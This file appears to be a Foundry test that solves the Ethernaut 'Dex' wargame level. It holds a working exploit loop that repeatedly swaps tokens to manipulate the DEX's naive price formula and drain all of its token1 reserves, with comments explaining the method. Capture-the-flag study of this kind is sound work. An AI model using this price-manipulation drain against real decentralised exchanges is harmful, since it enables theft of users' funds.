// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Dex/DexFactory.sol";
import "../src/Ethernaut.sol";

contract DexTest is Test {
    Ethernaut ethernaut;
    address player = address(100);

    function setUp() public {
        // create new instance of ethernaut
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether); // give our player 5 ether
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a <= b ? a : b;
    }

    function testDexHack() public {
        /****************
         * Factory setup *
         *************** */
        DexFactory dexFactory = new DexFactory();
        ethernaut.registerLevel(dexFactory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(dexFactory);
        Dex ethernautDex = Dex(payable(levelAddress));
        /****************
         *    Attack     *
         *************** */
        /*
         * goal of this level is for you to hack the basic DEX contract below and steal the funds by price manipulation.
         * If we decompose all functions, and pay attention to the function get_swap_price, here is what we need to read:
         * T1 = token1
         * T2 = token2
         * amount of T2 to be returned = (amount T1 * T2 in the contract balance) / T1 in contract balance
         * In the contract, there is a default balance of 100 for T1 and T2 ; the user has a balance of 10 for each
         * Example : Number of T1 to be returned = (30*110)/80 = 41.5
         * So let's go through what's happening below:
         * 1) we get the 2 tokens addresses
         * 2) approve the 2 tokens
         * 3) We declare an outside variable to ...
         * 4) We create a while loop that will carry on until token1 is down to 0
         * 5) we have a helper function that will return the smaller balance between player && ethernautDex
         *  Once the loop run for a condition, we switch the flip variable because every time we go in the loop
         *  A > B   A < B   A > B    A < B ...
         *  until the amount is 0 and we siphoned the whole dex reserves
         */

        // -- 1 --
        address token1Address = ethernautDex.token1();
        address token2Address = ethernautDex.token2();

        // -- 2 --
        ERC20(token1Address).approve(address(ethernautDex), type(uint256).max);
        ERC20(token2Address).approve(address(ethernautDex), type(uint256).max);

        // -- 3 --
        bool flip = true;

        // -- 4 --
        while (
            ethernautDex.balanceOf(token1Address, address(ethernautDex)) > 0
        ) {
            emit log_named_uint(
                "Remaining Token 1",
                ethernautDex.balanceOf(token1Address, address(ethernautDex))
            );
            emit log_named_uint(
                "Remaining Token 2",
                ethernautDex.balanceOf(token2Address, address(ethernautDex))
            );
            emit log_named_uint(
                "Token 1",
                ethernautDex.balanceOf(token1Address, player)
            );
            emit log_named_uint(
                "Token 2",
                ethernautDex.balanceOf(token2Address, player)
            );
            emit log("");

            // -- 5 --
            if (flip) {
                uint256 amount = min(
                    ethernautDex.balanceOf(token1Address, player),
                    ethernautDex.balanceOf(token1Address, address(ethernautDex))
                );
                ethernautDex.swap(token1Address, token2Address, amount);
                flip = false;
            } else {
                uint256 amount = min(
                    ethernautDex.balanceOf(token2Address, player),
                    ethernautDex.balanceOf(token2Address, address(ethernautDex))
                );
                ethernautDex.swap(token2Address, token1Address, amount);
                flip = true;
            }
        }

        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
